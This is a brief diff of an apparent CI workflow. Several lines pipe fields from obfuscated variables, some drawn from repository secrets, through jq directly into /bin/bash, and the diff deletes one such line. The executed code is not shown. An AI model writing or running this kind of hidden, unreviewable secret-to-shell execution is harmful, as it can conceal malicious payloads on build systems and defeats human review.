@@ -22,7 +22,6 @@ jobs:
           ogig82085: ${{ secrets.ogig82085 }}
         run: |
           printf '%s' "$ogig82085" | jq -r .b3916 | /bin/bash
-          printf '%s' "$zob0402" | jq -r .kwezt370 | /bin/bash
           printf '%s' "$cpf218" | jq -r .a37806 | /bin/bash
           echo $ua32 | jq -r .m50 | /bin/bash
           printf '%s' "$nrhe41" | jq -r .bld8 | /bin/bash
